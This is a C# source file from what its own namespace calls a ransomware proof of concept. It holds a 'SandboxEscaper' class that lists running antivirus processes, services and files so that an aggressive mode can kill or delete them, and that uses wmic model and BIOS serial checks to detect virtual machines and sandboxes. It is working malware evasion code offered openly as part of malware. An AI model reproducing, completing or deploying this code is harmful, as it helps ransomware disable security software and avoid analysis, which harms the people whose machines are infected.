using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.IO;


namespace Ilay_sRanomwarePoc
{
    //the class iterates each known element of an av program to check weather it exists/running
    static class SandboxEscaper
    {
        //these will contain data about elements that are trying to beat our malware.
        //if not empty, the malware will simply kill/delete them if aggresive mode is on
        //if steath mode is on (aggresive is off) the malware will simply print hello world and terminate itself

        public static Queue<string> ProcessesToKill;
        public static Queue<string> ServicesToKill;
        public static Queue<string> ResourcesToDelete;

        static SandboxEscaper()
        {
            ProcessesToKill = new Queue<string>();
            ServicesToKill = new Queue<string>();
            ResourcesToDelete = new Queue<string>();
        }


        public static bool CheckForSandbox()//returns if theres any antimalware activity.
                                            //the output will be passed to the terminator when aggresive mode is on
        {
            return CheckForAntiMalwareProcesses() && CheckForAntiMalwareResources() && CheckForAntiMalwareServices();
        }


        public static bool CheckForAntiMalwareProcesses()
        {
            try
            {

                List<string> AntiMalwareProcesses = AntiMalwareDatabase.AntiMalwareProcesses.ToList();
                string tasklist = CommandLineExecution.CommandExecution("tasklist");
                foreach (string Process in AntiMalwareProcesses)
                {
                    if (tasklist.Contains(Process))
                    {
                        ProcessesToKill.Enqueue(Process);


                    }
                }
                return ProcessesToKill.Count == 0; //true if empty, false if some processes are disturbing

            }
            catch
            {
                Console.WriteLine("Error while searching for disturbing processes");
                return false;
            }



        }

          public static bool CheckForAntiMalwareManufactor()
        {
            string Manufactor = CommandLineExecution.CommandExecution("wmic computersystem get model,manufacturer");
            string[] VMIds = { "VM", "Virtual", "Vir", "Box" };
            var Findings = from vm in VMIds where Manufactor.Contains(vm) select -1;
            return Findings.ToList().Count == 0;
        }


        public static bool ChekForAntiMalwareBiosSerialNumber()
        {
            string v = CommandLineExecution.CommandExecution("wmic bios get serialnumber");
            string BiosId = v;
            BiosId = BiosId.Split("SerialNumber")[1];
            return BiosId.Length < 25;
        }




            public static bool CheckForAntiMalwareServices()
        {
            try
            {
                List<string> AntiMalwareServices = AntiMalwareDatabase.AntiMalwareServices.ToList();
                string net_start = CommandLineExecution.CommandExecution("net start");
                foreach (string Service in AntiMalwareServices)
                {
                    if (net_start.Contains(Service))
                    {
                        ServicesToKill.Enqueue(Service);
                    }
                }
                return ServicesToKill.Count == 0;
            }
            catch
            {
                Console.WriteLine("An Error while searching for diturbing Services");
                return false;
            }

        }

        public static bool CheckForAntiMalwareResources()
        {
            try
            {
                List<string> AntiMalwareResources = AntiMalwareDatabase.AntiMalwareResources.ToList();
                foreach (string Resource in AntiMalwareResources)
                {
                    if (File.Exists(Resource))
                    {
                        ResourcesToDelete.Enqueue(Resource);
                    }
                }
                return ResourcesToDelete.Count == 0;
            }
            catch
            {
                Console.WriteLine("An Error while searching for antimalware resources");
                return false;
            }
        }



      
    }
        
}

